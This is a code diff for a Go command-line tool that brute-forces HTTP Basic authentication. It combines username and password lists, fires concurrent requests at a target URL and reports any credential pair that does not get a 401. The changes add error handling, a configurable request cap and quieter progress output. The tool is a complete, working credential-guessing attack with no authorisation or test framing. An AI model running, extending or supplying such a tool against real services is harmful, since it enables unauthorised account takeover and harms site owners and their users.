@@ -6,13 +6,19 @@ import (
 	"fmt"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 )
 
 func create_auth_list(uFile, pFile string) []string {
 	readLines := func(path string) []string {
-		f, _ := os.Open(path)
+		f, err := os.Open(path)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "[-] Failed to open file %s: %v\n", path, err)
+			os.Exit(1)
+		}
 		defer f.Close()
+
 		var out []string
 		s := bufio.NewScanner(f)
 		for s.Scan() {
@@ -21,6 +27,10 @@ func create_auth_list(uFile, pFile string) []string {
 				out = append(out, line)
 			}
 		}
+		if err := s.Err(); err != nil {
+			fmt.Fprintf(os.Stderr, "[-] Error reading file %s: %v\n", path, err)
+			os.Exit(1)
+		}
 		return out
 	}
 
@@ -28,73 +38,80 @@ func create_auth_list(uFile, pFile string) []string {
 	passes := readLines(pFile)
 
 	var basic_auth []string
-
 	for _, u := range users {
 		for _, p := range passes {
-			// auth := base64.StdEncoding.EncodeToString([]byte(u + ":" + p))
-			basic_auth = append(basic_auth, base64.StdEncoding.EncodeToString([]byte(u+":"+p)))
+			basic_auth = append(basic_auth,
+				base64.StdEncoding.EncodeToString([]byte(u+":"+p)))
 		}
 	}
-	//fmt.Println(basic_auth)
 	return basic_auth
-
 }
 
 func main() {
-
-	//domain_path := "https://example.com"
+	if len(os.Args) < 5 {
+		fmt.Fprintf(os.Stderr, "Usage: %s URL USERNAME_LIST PASSWORD_LIST MAX_REQUESTS\n", os.Args[0])
+		os.Exit(1)
+	}
 
 	domain_path := os.Args[1]
-
 	userFile := os.Args[2]
 	passFile := os.Args[3]
 
-	var auth_list = create_auth_list(userFile, passFile)
+	maxRequests, err := strconv.Atoi(os.Args[4])
+	if err != nil || maxRequests <= 0 {
+		fmt.Fprintf(os.Stderr, "[-] Invalid MAX_REQUESTS: %s\n", os.Args[4])
+		os.Exit(1)
+	}
 
-	// fmt.Println(auth_list)
+	auth_list := create_auth_list(userFile, passFile)
 
 	client := &http.Client{}
 
 	maxConcurrency := 50
 	limiter := make(chan struct{}, maxConcurrency)
-	maxRequests := 100
 	sent := 0
+
+	progressInterval := 5000 // prints once per 5k requests
 
 	for _, auth := range auth_list {
 		if sent >= maxRequests {
 			break
 		}
+
 		limiter <- struct{}{}
 		go func(a string) {
 			defer func() { <-limiter }()
 
-			req, _ := http.NewRequest("GET", domain_path, nil)
-			// req, _ := http.NewRequest("GET", "https://webhook.site/4bc57d4b-dd9c-4ed2-8add-bac2100892b3", nil)
+			req, err := http.NewRequest("GET", domain_path, nil)
+			if err != nil {
+				return
+			}
 
 			req.Header.Set("Authorization", "Basic "+a)
 			req.Header.Set("User-Agent", "MyGoRequester/1.0")
 
-			resp, _ := client.Do(req)
-
-			if resp != nil {
-				defer resp.Body.Close()
+			resp, err := client.Do(req)
+			if err != nil {
+				return
 			}
+			defer resp.Body.Close()
 
-			if resp != nil && resp.StatusCode != 401 {
-				fmt.Println(a)
+			// Print only if potentially correct
+			if resp.StatusCode != http.StatusUnauthorized {
+				fmt.Printf("[HIT] %s (status %d)\n", a, resp.StatusCode)
 			}
 		}(auth)
+
 		sent++
-		if sent%100 == 0 {
-			fmt.Printf("Sent %d requests...\n", sent)
+
+		// Light, non-noisy progress
+		if sent%progressInterval == 0 {
+			fmt.Printf("... %d requests sent\n", sent)
 		}
 	}
 
+	// Wait for all goroutines
 	for i := 0; i < cap(limiter); i++ {
 		limiter <- struct{}{}
 	}
 }
-
-//
-// RUN WITH -> go run PATH-TO-SCRIPT URL USERNAME-LIST-PATH PASSWORD-LIST-PATH
-//
